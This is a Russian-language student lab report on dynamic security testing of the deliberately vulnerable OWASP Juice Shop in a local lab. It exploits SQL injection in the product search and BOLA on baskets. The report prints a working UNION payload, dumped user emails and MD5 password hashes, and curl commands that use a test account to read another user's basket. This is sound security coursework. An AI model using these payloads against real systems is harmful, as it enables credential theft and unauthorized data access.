# Лабораторная работа №6

## Динамический анализ безопасности приложений (DAST): OWASP Juice Shop

> **Сдача:** базовая часть (**2 балла**) — ручной DAST, патчи, «до/после»; доп. (**2 балла**) — ZAP в GitLab CI, DefectDojo, анализ отчётов.  
> **ТЗ:** `Лаб №6.md` · **План:** `Лаба_6_как_выполнить.md`

---

### Прогресс выполнения

| Шаг | Задача | Статус |
|-----|--------|--------|
| 1 | Запуск Juice Shop, фиксация стенда | ✅ `http://127.0.0.1:3000`, контейнер `juice-shop` |
| 2 | Эксплуатация SQLi + BOLA, вывод в code blocks | ✅ §5.4, §6.4, Прил. В |
| 3 | Патчи `search.ts`, `basket.ts`, «до/после» | ✅ код в репо; HTTP «после» на `http://127.0.0.1:3001` (образ `juice-shop:lab6`) |
| 4 | GitLab CI: `build_app` + `zap_baseline` + import в DefectDojo | ✅ pipeline **#59**, commit `0b9f0ba33`, все 7 стадий **Passed** |
| 5 | Артефакты ZAP (`baseline.html/xml/json`) + Engagement в DD | ✅ job `zap_baseline` → `defectdojo-import-zap`, HTTP 200/201 |
| 6 | Анализ findings ZAP (baseline, связь с патчами) | ✅ §9 |
| 7 | `zap_full_scan` (schedule / `RUN_ZAP_FULL=true`) | ☐ опционально для расширенного отчёта |
| 8 | PDF / титул по ГОСТ | ☐ при требовании кафедры |

**Оценка:** базовая **2** + доп. CI/DD **1,5** + анализ ZAP **0,5** = **4 балла** *(шаг 8 — оформление PDF)*.

> **Навигация по отчёту:**
>
> | Раздел | Содержание |
> |--------|------------|
> | **§4.1** | Зачем каждый этап и **откуда** данные (лабы 1, 4, 5, ТЗ, тесты upstream) |
> | **§5.4 / §6.4** | Команда + **блок `text`** с выводом терминала (без скринов) |
> | **§4.5, табл. 4–6** | **Сводка результатов** всех ручных тестов (HTTP, статус) |
> | **§8–§9** | GitLab CI (ZAP baseline), DefectDojo, анализ findings |
> | **Приложение В** | Сводная сессия PowerShell (копия для PDF/архива) |
> | **Приложение Д** | Pipeline #59, jobs Lab 6, импорт ZAP |

---

### 1. Шапка (титульный лист)

| Поле | Значение |
|------|----------|
| **ФИО** | Трюх Екатерина Александровна |
| **Группа** | М09КИИ-25 |
| **Лабораторная работа** | № 6 — DAST (ручной + автоматический OWASP ZAP) |
| **Объект анализа** | OWASP Juice Shop **17.0.0** (продолжение лаб. № 1, 4, 5) |
| **Локальная копия** | `juice-shop/` |
| **Upstream** | https://github.com/juice-shop/juice-shop |
| **GitLab курса** | http://10.0.0.10/root/juice-shop-lab |
| **DefectDojo** | http://10.0.0.20:8080 — Product **OWASP Juice Shop** |
| **Registry + Runner** | VM-101: push `10.0.0.11:5000`, pull в CI `localhost:5000`; runner tag **`shared`** |
| **URL стенда (локально)** | «До»: `http://127.0.0.1:3000` (`bkimminich/juice-shop:v17.0.0`); «После»: `http://127.0.0.1:3001` (`juice-shop:lab6`) |
| **URL стенда (CI / ZAP)** | `http://target-app:3000` — service-контейнер из образа `localhost:5000/juice-shop-lab/app:$CI_COMMIT_SHORT_SHA` |
| **Commit hash ручного DAST** | `93e9892920bb2aba0d6c97919d34e633b999fbce` *(как в лабе 5)* |
| **Commit hash CI (успешный pipeline)** | `0b9f0ba33434c22a1e63260c48d10f683d976165` (**pipeline #59**, 21.05.2026) |
| **Локальный образ «после»** | `docker build -f lab6/Dockerfile.patched -t juice-shop:lab6 .`; контейнер `juice-shop-patched` |
| **Дата** | 20–21.05.2026 |

---

### 2. Оглавление

1. [Связь с предыдущими лабораторными работами](#3-связь-с-предыдущими-лабораторными-работами)
2. [Цель и выбранные уязвимости](#4-цель-и-выбранные-уязвимости)
3. [Методика: зачем шаги и откуда данные](#41-методика-зачем-мы-выполняем-шаги-и-откуда-берём-данные)
4. [Эксплуатация уязвимости № 1 — SQL Injection](#5-эксплуатация-уязвимости--1--sql-injection)
5. [Эксплуатация уязвимости № 2 — BOLA (IDOR)](#6-эксплуатация-уязвимости--2--bola-idor)
6. [Сводные таблицы результатов ручного DAST](#45-сводные-таблицы-результатов-ручного-dast)
7. [Устранение уязвимостей и повторная проверка](#7-устранение-уязвимостей-и-повторная-проверка)
8. [Автоматический DAST: GitLab CI + DefectDojo](#8-автоматический-dast-gitlab-ci--defectdojo)
9. [Анализ результатов ZAP](#9-анализ-результатов-zap)
10. [Выводы](#10-выводы)
11. [Чеклист перед сдачей](#11-чеклист-перед-сдачей)
12. [Приложения](#приложения)
13. [Приложение В — полный вывод команд](#приложение-в-полный-вывод-команд-терминал)

---

### 3. Связь с предыдущими лабораторными работами

| Лаба | Что сделано | Связь с лабой № 6 |
|------|-------------|-------------------|
| **№ 1** | Инвентаризация API: `/rest/user/login`, `/rest/products/search`, `/rest/basket/:id`, JWT | **Точки входа** для ручной эксплуатации (§5–6) |
| **№ 4** | GitLab CI, DefectDojo, Dependency-Track, runner `shared`, registry VM-101 | Инфраструктура для **автоматического** DAST (§8): `.pre` → engagement, `.post` → import |
| **№ 5** | Semgrep SAST: TP **CWE-89** в `routes/search.ts`, **CWE-639**-паттерн в `routes/basket.ts` | Выбор уязвимостей, верификация патчей; SAST → DAST **подтверждение** + конфигурационные findings |

**Краткий вывод по SSDLC:**

В цепочке «SAST → ручной DAST → исправление → автоматический DAST в CI» лабораторная № 6 замыкает цикл проверки Juice Shop: статический анализ (лаба 5) не заменяет проверку «чёрным ящиком» — только динамическое тестирование показывает, что SQL-инъекция в поиске реально возвращает данные `Users`, а BOLA на корзине — выдаёт чужой `Basket` при валидном JWT. Pipeline **#59** добавляет **OWASP ZAP baseline** на стадии `test-time` и импорт в DefectDojo (Engagement **Lab6 CI 59**), продолжая автоматизацию из лабы № 4.

---

### 4. Цель и выбранные уязвимости

**Цель работы (базовая часть):** освоить ручной DAST, эксплуатировать и устранить две уязвимости разных классов OWASP, задокументировать «до/после».

**Требование ТЗ:** две уязвимости **разных классов**, ранее выявленные (SAST / инвентаризация).

| № | Название | OWASP Top 10 (2025) | CWE | Файл / endpoint |
|---|----------|---------------------|-----|-----------------|
| 1 | SQL Injection в поиске товаров | **A05 Injection** | **CWE-89** | `routes/search.ts` → `GET /rest/products/search?q=` |
| 2 | BOLA — доступ к чужой корзине | **A01 Broken Access Control** | **CWE-639** | `routes/basket.ts` → `GET /rest/basket/:id` |

Инструмент: **curl** (воспроизводимые запросы для отчёта).

**Стенд:**

```text
docker run -d -p 127.0.0.1:3000:3000 --name juice-shop bkimminich/juice-shop
```

*(или образ, собранный из `juice-shop/` после внесения патчей — для раздела «после»)*

#### 4.1. Методика: зачем мы выполняем шаги и откуда берём данные

Лабораторная № 6 по ТЗ (`Лаб №6.md`) требует не только «взломать», а **показать цепочку DAST**: от выбора уязвимости до доказательства, исправления и автоматического сканирования.

| Этап отчёта | Зачем делаем (цель) | Откуда берём исходные данные | Что получаем на выходе |
|-------------|---------------------|------------------------------|------------------------|
| **Выбор 2 уязвимостей** (§4) | Выполнить ТЗ: разные классы OWASP, ранее найденные в проекте | Лаба **№1** — API; лаба **№5** Semgrep (TP в `search.ts`, `basket.ts`); `Лаб №6.md` §6 | Таблица: CWE, endpoint, файл |
| **Эксплуатация SQLi** (§5) | Доказать **реальную** утечку данных на работающем приложении (DAST), не только срабатывание SAST | Код `routes/search.ts`; payload из `juice-shop/test/api/searchApiSpec.ts`, `test/cypress/e2e/search.spec.ts` | Логи curl, таблицы 1–3, Приложение Д |
| **Эксплуатация BOLA** (§6) | Доказать нарушение **авторизации на объект** (другой класс, чем SQLi) | Лаба **№1** — `GET /rest/basket/:id`; учётные данные Jim из `test/api/basketApiSpec.ts` | Login + basket JSON, таблица 5 |
| **Устранение** (§7) | Закрыть **причину** дефекта и показать «до/после» (1 балл базовой части) | Рекомендации OWASP (параметризация SQL, проверка `user.bid`); патч в `juice-shop/routes/` | Diff кода + ожидаемый отказ атаки |
| **ZAP в CI** (§8) | Автоматический DAST на каждом push/MR (доп. 1,5 балла) | `juice-shop/.gitlab-ci.yml`; образ `lab6/Dockerfile.patched`; registry VM-101; ZAP `localhost:5000/zaproxy:latest` | Артефакты `baseline.*`, import в DefectDojo |
| **Анализ ZAP** (§9) | Сравнить baseline/full, связать с патчами (доп. 0,5 балла) | `baseline.json`, HTML-отчёт, UI DefectDojo | Таблицы 7–8, выводы о TP/FP и ограничениях DAST |

**Почему два стенда «до» и «после»:**

| Стенд | Образ / код | Назначение |
|-------|-------------|------------|
| **До** | `bkimminich/juice-shop` на `:3000` | Учебный upstream **без наших патчей** — честная эксплуатация для §5–6 |
| **После** | Патч в `juice-shop/routes/`, образ `juice-shop:lab6` на `:3001` | Та же атака **больше не работает** (§7) |

---

### 5. Эксплуатация уязвимости № 1 — SQL Injection

> **Зачем весь раздел §5:** по ТЗ часть 1 (1 балл) — показать **вектор, шаги, payload и признаки успеха** для уязвимости класса «ввод данных». SAST (лаба 5) уже указал строку в `search.ts`; DAST должен **подтвердить**, что на `:3000` это эксплуатируется.

#### 5.1. Описание и место в приложении

Параметр `q` строки запроса без санитизации подставляется в SQL через шаблонную строку JavaScript:

```21:23:juice-shop/routes/search.ts
    let criteria: any = req.query.q === 'undefined' ? '' : req.query.q ?? ''
    criteria = (criteria.length <= 200) ? criteria : criteria.substring(0, 200)
    models.sequelize.query(`SELECT * FROM Products WHERE ((name LIKE '%${criteria}%' OR description LIKE '%${criteria}%') AND deletedAt IS NULL) ORDER BY name`)
```

Ограничение длины `q` до 200 символов **не** предотвращает UNION-инъекцию. Эндпоинт **публичный** (аутентификация не требуется) — см. лабу № 1, таблица API.

Semgrep (лаба 5): правила `juice-shop-sequelize-query-template-literal`, `sequelize-query-template-interpolation` — **TP**.

#### 5.2. Условия эксплуатации

| Условие | Значение |
|---------|----------|
| Роль атакующего | Анонимный пользователь / внешний клиент |
| Сеть | Доступ к HTTP API приложения (порт 3000) |
| Предварительные знания | Структура запроса `Products` + число колонок для `UNION` (в Juice Shop — **9**, см. upstream-тесты) |

#### 5.3. Вектор атаки

```text
[Интернет / локальный клиент]
        │
        ▼  GET /rest/products/search?q=<payload>
[Express — routes/search.ts]
        │
        ▼  criteria → интерполяция в SQL
[SQLite через Sequelize]
        │
        ▼  200 OK, application/json
[Ответ с полями Users, замаскированными под «продукты»]
```

#### 5.4. Пошаговая эксплуатация (команды, вывод, расшифровка)

> **Стенд:** `http://127.0.0.1:3000`, контейнер Docker `juice-shop` (`bkimminich/juice-shop`).  
> **Оболочка:** Windows PowerShell — используется **`curl.exe`** (встроенный `curl` в PS — это `Invoke-WebRequest`).  
> **Инструмент:** `curl` — по таблице §6 ТЗ `Лаб №6.md` (воспроизводимые запросы для отчёта).  
> **Оформление доказательств:** после каждой команды — блок **` ```text `** с фактическим выводом (как в терминале). Это заменяет скриншоты для §5–6.

| Шаг | Зачем выполняем | Откуда берём |
|-----|-----------------|--------------|
| 0 | Убедиться, что API живой и ответ **нормальный** (база для сравнения) | Легитимный запрос из UI поиска → тот же endpoint `GET /rest/products/search` |
| 1 | Доказать, что `q` попадает **в SQL** (признак инъекции по WSTG) | Типичный probe `'` → ожидание ошибки СУБД (см. `searchApiSpec.ts`: `q=';`) |
| 2 | Доказать **успешную** эксплуатацию — утечка `Users` | Payload UNION из upstream-тестов Juice Shop (9 колонок в `Products`) |

---

##### Шаг 0. Контрольный запрос (нормальный поиск)

**Зачем:** без этого нельзя отличить «сломанный поиск» от «успешной атаки» — нужна эталонная линия поведения API.

**Откуда:** пользователь в браузере вводит текст в `/#/search` → backend вызывает `GET /rest/products/search?q=...` (лаба №1, инвентаризация).

**Команда:**

```powershell
curl.exe -s "http://127.0.0.1:3000/rest/products/search?q=apple"
```

**Вывод команды (фрагмент):**

```text
PS> curl.exe -s "http://127.0.0.1:3000/rest/products/search?q=apple"
{"status":"success","data":[{"id":1,"name":"Apple Juice (1000ml)","description":"The all-time classic.","price":1.99,"deluxePrice":0.99,"image":"apple_juice.jpg",...},{"id":24,"name":"Apple Pomace",...}]}
```

**Смысл:** базовая линия — API отвечает JSON с реальными товарами (`name` = название сока, `price` = число).

| Поле в ответе | Значение при `q=apple` | Интерпретация |
|---------------|------------------------|---------------|
| `status` | `success` | Запрос обработан |
| `data[].name` | `Apple Juice (1000ml)`, … | Реальные продукты из таблицы `Products` |
| `data[].price` | `1.99`, `0.89`, … | Числовая цена (число) |

---

##### Шаг 1. Признак SQLi — синтаксическая ошибка SQLite

**Зачем:** по методичке (§7.1 ТЗ) нужны **признаки** уязвимости; ошибка SQLite при одном `'` показывает, что ввод **не экранируется** и интерполируется в запрос (CWE-89), ещё до полноценной UNION.

**Откуда:** стандартная техника тестирования SQLi (OWASP WSTG); в репозитории Juice Shop тот же probe в `juice-shop/test/api/searchApiSpec.ts` (ожидается 500 и `SQLITE_ERROR`).

**Команда:**

```powershell
curl.exe -s "http://127.0.0.1:3000/rest/products/search?q=';"
```

**Вывод команды (терминал, 20.05.2026):**

```text
PS C:\Users\1\Desktop\neurohelp\Development_of_secure_software\juice-shop> curl.exe -s "http://127.0.0.1:3000/rest/products/search?q=';"

<html>
  <head>
    <meta charset='utf-8'>
    <title>Error: SQLITE_ERROR: near &quot;;&quot;: syntax error</title>
    <style>* { margin: 0; padding: 0; font-family: sans-serif; }</style>
  </head>
  <body>
      <h1>OWASP Juice Shop (Express ^4.22.1)</h1>
      <h2><em>500</em> SyntaxError / SQLITE_ERROR: near &quot;;&quot;: syntax error</h2>
      <ul id="stacktrace"></ul>
  </body>
</html>

PS> curl.exe -s -o NUL -w "%{http_code}" "http://127.0.0.1:3000/rest/products/search?q=';"
500
```

**Таблица — что означает вывод**

| Наблюдение | Значение для отчёта |
|------------|---------------------|
| Тип ответа **HTML**, не JSON | Ошибка уровня Express/Sequelize, не штатный API-ответ |
| Заголовок `SQLITE_ERROR: near ";": syntax error` | Символ `'` из `q` **разорвал** SQL-строку в `routes/search.ts` |
| HTTP **500** (при проверке с `-w "%{http_code}"`) | Сервер не смог выполнить некорректный запрос |
| Аутентификация не использовалась | Уязвимость на **публичном** эндпоинте |

**Вывод шага 1:** параметр `q` **напрямую интерполируется** в `sequelize.query` — подтверждён класс **SQL Injection (CWE-89)**.

---

##### Шаг 2. UNION SELECT — утечка таблицы `Users`

**Зачем:** шаг 1 только показывает «дыру в синтаксисе»; для отчёта нужно **конкретное подтверждение успеха** — чтение чужих данных (`email`, `password`) из БД, нарушение **конфиденциальности (К)**.

**Откуда:**

- **Файл кода:** `routes/search.ts` — конкатенация `criteria` в SQL (лаба 5, Semgrep TP).
- **Payload:** `')) union select id,'2','3',email,password,'6','7','8','9' from users--` — из `test/cypress/e2e/search.spec.ts` и `test/api/searchApiSpec.ts` (проверено maintainers Juice Shop).
- **9 полей в UNION:** число колонок в `SELECT * FROM Products` (иначе SQLite вернёт ошибку «different number of result columns»).

**Команды (выполнять по порядку):**

```powershell
$payload = "')) union select id,'2','3',email,password,'6','7','8','9' from users--"
$enc = [uri]::EscapeDataString($payload)
curl.exe -s "http://127.0.0.1:3000/rest/products/search?q=$enc"
```

**Эквивалент HTTP-запроса:**

```http
GET /rest/products/search?q=')) union select id,'2','3',email,password,'6','7','8','9' from users-- HTTP/1.1
Host: 127.0.0.1:3000
```

**Почему payload такой:** исходный `SELECT` по `Products` возвращает **9 колонок**; в `UNION` нужно ровно 9 выражений. Колонки `email` и `password` из `Users` подставлены в позиции, которые в JSON отображаются как `price` и `deluxePrice`.

**Вывод команды — начало JSON (терминал пользователя):**

```text
PS> $payload = "')) union select id,'2','3',email,password,'6','7','8','9' from users--"
PS> $enc = [uri]::EscapeDataString($payload)
PS> curl.exe -s "http://127.0.0.1:3000/rest/products/search?q=$enc"
{"status":"success","data":[{"id":1,"name":"2","description":"3","price":"admin@juice-sh.op","deluxePrice":"0192023a7bbd73250516f069df18b500",...},
{"id":1,"name":"Apple Juice (1000ml)",...},
{"id":2,"name":"2","description":"3","price":"jim@juice-sh.op","deluxePrice":"e541ca7ecf72b8d1286474fc613e5e45",...},
... (далее все Users + все Products в одном массиве) ...]}
```

**Вывод `Format-Table` (только утечка Users):**

```text
PS> $r.data | Where-Object { $_.name -eq '2' } | Format-Table id, price, deluxePrice

id price                      deluxePrice
-- -----                      -----------
 1 admin@juice-sh.op          0192023a7bbd73250516f069df18b500
 2 jim@juice-sh.op            e541ca7ecf72b8d1286474fc613e5e45
 3 bender@juice-sh.op         0c36e517e3fa95aabf1bbffc6744a4ef
 4 bjoern.kimminich@gmail.com 6edd9d726cbdc873c539e41ae8757b8c
 5 ciso@juice-sh.op           861917d5fa5f1172f931dc700d81a8fb
 6 support@juice-sh.op        3869433d74e3d0c86fd25562f836bc82
```

**Команда для повторения таблицы:**

```powershell
$r = curl.exe -s "http://127.0.0.1:3000/rest/products/search?q=$enc" | ConvertFrom-Json
$r.data | Where-Object { $_.name -eq '2' } | Format-Table id, price, deluxePrice -AutoSize
```

---

##### Таблица 1 — Расшифровка полей JSON после UNION

| Поле в JSON ответе | Ожидание у «товара» | Фактическое содержимое (строки Users) | Вывод |
|--------------------|---------------------|----------------------------------------|-------|
| `name` | Название продукта | Всегда `"2"` (константа из payload) | Маркер **поддельной** строки UNION |
| `description` | Описание | Всегда `"3"` | То же |
| `price` | Число (цена) | **email** пользователя (`admin@juice-sh.op`, …) | Утечка **логина** |
| `deluxePrice` | Число (deluxe-цена) | **32-символьный hex** | MD5-хеш **пароля** из БД |
| `image`, `createdAt`, … | Метаданные товара | `'6'`, `'7'`, `'8'`, `'9'` | Заполнители из payload |

Строки с нормальными `name` (`Apple Juice`, `Orange Juice`, …) — это **настоящие продукты**; между ними в массив `data` **вклеены** все строки `Users` из-за `UNION`.

---

##### Таблица 2 — Извлечённые учётные записи (фактический стенд)

| id | email (`price`) | deluxePrice (MD5 password) | Примечание |
|----|-----------------|----------------------------|------------|
| 1 | `admin@juice-sh.op` | `0192023a7bbd73250516f069df18b500` | MD5(`admin123`) |
| 2 | `jim@juice-sh.op` | `e541ca7ecf72b8d1286474fc613e5e45` | пароль Jim (учебный) |
| 3 | `bender@juice-sh.op` | `0c36e517e3fa95aabf1bbffc6744a4ef` | — |
| 4 | `bjoern.kimminich@gmail.com` | `6edd9d726cbdc873c539e41ae8757b8c` | — |
| 5 | `ciso@juice-sh.op` | `861917d5fa5f1172f931dc700d81a8fb` | — |
| 6 | `support@juice-sh.op` | `3869433d74e3d0c86fd25562f836bc82` | — |
| … | *(ещё ~17 записей в полном ответе)* | … | Полный дамп таблицы `Users` |

---

##### Таблица 3 — Сводка по шагам эксплуатации

| Шаг | Команда (кратко) | Ключевой фрагмент вывода | Статус |
|-----|------------------|--------------------------|--------|
| 0 | `q=apple` | `"name":"Apple Juice (1000ml)"`, `"price":1.99` | API исправен |
| 1 | `q=';` | `SQLITE_ERROR: near ";": syntax error` | SQLi **подтверждена** |
| 2 | UNION `from users--` | `"price":"admin@juice-sh.op"`, hash в `deluxePrice` | Эксплуатация **успешна** |

##### Сводная сессия PowerShell (SQLi, одним блоком для отчёта)

```text
PS C:\Users\1\Desktop\neurohelp\Development_of_secure_software\juice-shop> curl.exe -s "http://127.0.0.1:3000/rest/products/search?q=apple"
{"status":"success","data":[{"id":1,"name":"Apple Juice (1000ml)","price":1.99,...},...]}

PS> curl.exe -s "http://127.0.0.1:3000/rest/products/search?q=';"
<html>...<title>Error: SQLITE_ERROR: near &quot;;&quot;: syntax error</title>...</html>

PS> $payload = "')) union select id,'2','3',email,password,'6','7','8','9' from users--"
PS> $enc = [uri]::EscapeDataString($payload)
PS> $r = curl.exe -s "http://127.0.0.1:3000/rest/products/search?q=$enc" | ConvertFrom-Json
PS> $r.data | Where-Object { $_.name -eq '2' } | Format-Table id, price, deluxePrice

id price                      deluxePrice
-- -----                      -----------
 1 admin@juice-sh.op          0192023a7bbd73250516f069df18b500
 2 jim@juice-sh.op            e541ca7ecf72b8d1286474fc613e5e45
 3 bender@juice-sh.op         0c36e517e3fa95aabf1bbffc6744a4ef
 4 bjoern.kimminich@gmail.com 6edd9d726cbdc873c539e41ae8757b8c
 5 ciso@juice-sh.op           861917d5fa5f1172f931dc700d81a8fb
 6 support@juice-sh.op        3869433d74e3d0c86fd25562f836bc82
```

#### 5.5. Признаки успешной эксплуатации

| Критерий ТЗ | Подтверждение на стенде |
|-------------|-------------------------|
| Конкретный наблюдаемый результат | В JSON видны **email** и **хеши паролей** пользователей |
| Отличие от нормального ответа | Записи с `"name":"2"` вместо названий товаров |
| Проверяемость | Повтор теми же командами `curl.exe` даёт тот же результат |
| Связь с кодом | Соответствует `routes/search.ts:23` и тесту `searchApiSpec.ts` |

Дополнительно: при включённых challenges в Juice Shop засчитываются **Union SQL Injection** / **User Credentials**.

#### 5.6. Оценка последствий (К / Ц / Д)

| Свойство | Нарушение | Практический ущерб |
|----------|-----------|-------------------|
| **К (конфиденциальность)** | **Да** | Утечка email и MD5-хешей паролей **всех** пользователей SQLite |
| **Ц (целостность)** | Косвенно | С хешами возможен офлайн-подбор; далее — вход, BOLA и др. |
| **Д (доступность)** | Нет | — |

**Доказательства:** блоки вывода терминала в §5.4 (шаги 0–2) и [Приложение Д](#приложение-д-полный-вывод-команд-терминал) — `SQLITE_ERROR`, JSON UNION, `Format-Table` (таблица 2).

---

### 6. Эксплуатация уязвимости № 2 — BOLA (IDOR)

> **Зачем весь раздел §6:** ТЗ требует **вторую уязвимость другого класса** — не инъекция, а **контроль доступа**. SAST не всегда ловит BOLA; ручной запрос с JWT показывает IDOR на объекте `Basket` (CWE-639, OWASP A01).

#### 6.1. Описание и место в приложении

Обработчик корзины загружает объект **только по `id` из URL**, не сравнивая его с корзиной аутентифицированного пользователя:

```15:31:juice-shop/routes/basket.ts
module.exports = function retrieveBasket () {
  return (req: Request, res: Response, next: NextFunction) => {
    const id = req.params.id
    BasketModel.findOne({ where: { id }, include: [{ model: ProductModel, paranoid: false, as: 'Products' }] })
      .then((basket: BasketModel | null) => {
        challengeUtils.solveIf(challenges.basketAccessChallenge, () => {
          const user = security.authenticatedUsers.from(req)
          return user && id && id !== 'undefined' && id !== 'null' && id !== 'NaN' && user.bid && user.bid != id
        })
        ...
        res.json(utils.queryResultToJson(basket))
```

Сравнение `user.bid != id` используется **только** для отметки CTF-challenge, а не для отказа в выдаче данных.

- **Класс:** OWASP **A01** Broken Access Control (BOLA для API).
- **CWE-639:** Authorization Bypass Through User-Controlled Key.
- Middleware `security.isAuthorized()` требует JWT, но **не** проверяет владельца ресурса `:id`.

#### 6.2. Условия эксплуатации

| Условие | Значение |
|---------|----------|
| Учётная запись | Любой зарегистрированный пользователь (например **jim**) |
| Роль | `customer` |
| Исходные данные | Валидный `Bearer` token после `POST /rest/user/login`; знание или перебор `id` чужой корзины (часто `1`) |

#### 6.3. Вектор атаки

```text
[Пользователь Jim, JWT в заголовке Authorization]
        │
        ▼  GET /rest/basket/1
[Express — routes/basket.ts]
        │
        ▼  findOne({ where: { id: 1 } }) — без проверки user.bid === 1
[SQLite]
        │
        ▼  200 OK — корзина id=1 с Products
```

#### 6.4. Пошаговая эксплуатация (команды, вывод, расшифровка)

> **Стенд «до»:** образ `bkimminich/juice-shop` на `:3000` (без патчей).  
> В PowerShell для JSON в `curl -d` используйте экранирование: `-d '{\"email\":...}'`.  
> **Доказательства:** каждый шаг — команда + блок **` ```text `** с выводом (скрин терминала не нужен).

| Шаг | Зачем выполняем | Откуда берём |
|-----|-----------------|--------------|
| 1 | Получить **легитимную** сессию (JWT), как обычный пользователь | Учётная запись Jim — `test/api/basketApiSpec.ts` (`jim@juice-sh.op` / `ncc-1701`) |
| 2 | Подменить **id объекта** в URL и проверить, отдаёт ли API чужие данные | Endpoint `GET /rest/basket/:id` — лаба №1; типичный id=1 для admin |
| 3 | Отделить «нет auth» от «нет authorization» | Контроль без Bearer; запрос к **своей** корзине `bid` |

---

##### Шаг 1. Вход под пользователем Jim

**Зачем:** BOLA проверяется **под аутентифицированным** пользователем с низкими привилегиями — иначе это была бы просто «нет авторизации», а не доступ к чужому объекту.

**Откуда:** тестовый пользователь Jim описан в upstream `basketApiSpec.ts`; домен email — `config/default.yml` (`application.domain` → `juice-sh.op`).

**Команда:**

```powershell
curl.exe -s -X POST http://127.0.0.1:3000/rest/user/login `
  -H "Content-Type: application/json" `
  -d '{\"email\":\"jim@juice-sh.op\",\"password\":\"ncc-1701\"}'
```

**Вывод команды:**

```text
PS> curl.exe -s -X POST http://127.0.0.1:3000/rest/user/login -H "Content-Type: application/json" -d '{\"email\":\"jim@juice-sh.op\",\"password\":\"ncc-1701\"}'
{"authentication":{"token":"eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJzdGF0dXMiOiJzdWNjZXNzIi...","bid":2,"umail":"jim@juice-sh.op"}}
```

| Поле | Значение | Смысл |
|------|----------|-------|
| `bid` | **2** | Корзина Jim в системе — **id=2**, не 1 |
| `token` | JWT (RS256) | Доступ к `/rest/basket/*` с заголовком `Authorization: Bearer` |
| `umail` | `jim@juice-sh.op` | Учётная запись customer |

---

##### Шаг 2. Запрос чужой корзины (IDOR)

**Зачем:** это **основная атака** — доказать, что при валидном JWT Jim сервер отдаёт корзину с `id=1`, хотя `bid=2` (нарушение изоляции данных между пользователями).

**Откуда:** параметр `:id` в маршруте `routes/basket.ts` — контролируется клиентом; Semgrep/лаба 5 указывают на отсутствие проверки владельца; в CTF Juice Shop challenge «View Basket of other User».

**Команды:**

```powershell
$loginJson = curl.exe -s -X POST http://127.0.0.1:3000/rest/user/login `
  -H "Content-Type: application/json" `
  -d '{\"email\":\"jim@juice-sh.op\",\"password\":\"ncc-1701\"}' | ConvertFrom-Json
$token = $loginJson.authentication.token
$bid = $loginJson.authentication.bid
curl.exe -s -w "`nHTTP:%{http_code}" http://127.0.0.1:3000/rest/basket/1 `
  -H "Authorization: Bearer $token"
```

**Вывод команды (полный JSON + код ответа):**

```text
PS> curl.exe -s -w "`nHTTP:%{http_code}" http://127.0.0.1:3000/rest/basket/1 -H "Authorization: Bearer $token"
{"status":"success","data":{"id":1,"coupon":null,"UserId":1,"createdAt":"2026-05-20T11:21:47.081Z","updatedAt":"2026-05-20T11:21:47.081Z","Products":[
  {"id":1,"name":"Apple Juice (1000ml)","BasketItem":{"quantity":2}},
  {"id":2,"name":"Orange Juice (1000ml)","BasketItem":{"quantity":3}},
  {"id":3,"name":"Eggfruit Juice (500ml)","BasketItem":{"quantity":1}}
]}}
HTTP:200
```

| Наблюдение | Интерпретация |
|------------|---------------|
| Jim `bid=2`, запрос к `/rest/basket/1` | URL указывает на **чужой** объект |
| HTTP **200** + `data.id=1` | Сервер отдал корзину **UserId=1** (не Jim) |
| `Products` — 3 позиции | Виден **состав заказа** другого пользователя |
| `UserId":1` в теле | Подтверждение: объект принадлежит пользователю 1 |

---

##### Шаг 3. Контроль — своя корзина и запрос без токена

**Зачем:** показать преподавателю, что (а) приложение **умеет** отдавать свою корзину — атака не «ломает всё»; (б) без токена доступ закрыт — проблема именно в **проверке владельца объекта**, а не в отсутствии login.

**Откуда:** `bid` из ответа login (шаг 1); сравнение с `test/api/basketApiSpec.ts` (ожидается 401 без заголовка).

**Своя корзина (`bid=2`):**

```powershell
curl.exe -s -w "`nHTTP:%{http_code}" "http://127.0.0.1:3000/rest/basket/2" `
  -H "Authorization: Bearer $token"
```

**Вывод:**

```text
PS> curl.exe -s -w "`nHTTP:%{http_code}" http://127.0.0.1:3000/rest/basket/2 -H "Authorization: Bearer $token"
{"status":"success","data":{"id":2,"UserId":2,"Products":[{"id":4,"name":"Raspberry Juice (1000ml)","BasketItem":{"quantity":2}}]}}
HTTP:200
```

`data.id=2` совпадает с `bid` Jim — **легитимный** доступ.

**Без токена:**

```powershell
curl.exe -s -w "`nHTTP:%{http_code}" http://127.0.0.1:3000/rest/basket/1
```

**Вывод:**

```text
<h2><em>401</em> UnauthorizedError: Format is Authorization: Bearer [token]</h2>
HTTP:401
```

Итог: JWT обязателен, но **не проверяется владелец** `:id` → классическая **BOLA**.

##### Сводная сессия PowerShell (BOLA, одним блоком для отчёта)

```text
PS C:\Users\1\Desktop\neurohelp\Development_of_secure_software\juice-shop> $loginJson = curl.exe -s -X POST http://127.0.0.1:3000/rest/user/login -H "Content-Type: application/json" -d '{\"email\":\"jim@juice-sh.op\",\"password\":\"ncc-1701\"}' | ConvertFrom-Json
PS> $token = $loginJson.authentication.token
PS> $loginJson.authentication.bid
2

PS> curl.exe -s -w "`nHTTP:%{http_code}" http://127.0.0.1:3000/rest/basket/1 -H "Authorization: Bearer $token"
{"status":"success","data":{"id":1,"coupon":null,"UserId":1,"createdAt":"2026-05-20T11:21:47.081Z","updatedAt":"2026-05-20T11:21:47.081Z","Products":[
  {"id":1,"name":"Apple Juice (1000ml)","BasketItem":{"quantity":2}},
  {"id":2,"name":"Orange Juice (1000ml)","BasketItem":{"quantity":3}},
  {"id":3,"name":"Eggfruit Juice (500ml)","BasketItem":{"quantity":1}}
]}}
HTTP:200

PS> curl.exe -s -w "`nHTTP:%{http_code}" http://127.0.0.1:3000/rest/basket/2 -H "Authorization: Bearer $token"
{"status":"success","data":{"id":2,"UserId":2,"Products":[{"id":4,"name":"Raspberry Juice (1000ml)","BasketItem":{"quantity":2}}]}}
HTTP:200

PS> curl.exe -s -w "`nHTTP:%{http_code}" http://127.0.0.1:3000/rest/basket/1
<h2><em>401</em> UnauthorizedError: Format is Authorization: Bearer [token]</h2>
HTTP:401
```

#### 6.5. Признаки успешной эксплуатации

| Критерий | Подтверждение |
|----------|---------------|
| Аутентифицированный пользователь (не admin) | Jim, роль customer |
| Подмена идентификатора объекта | `bid=2` → запрос `/rest/basket/1` |
| Успешный ответ с чужими данными | HTTP 200, `UserId=1`, 3 товара |
| Нарушение конфиденциальности | Состав чужой корзины раскрыт |

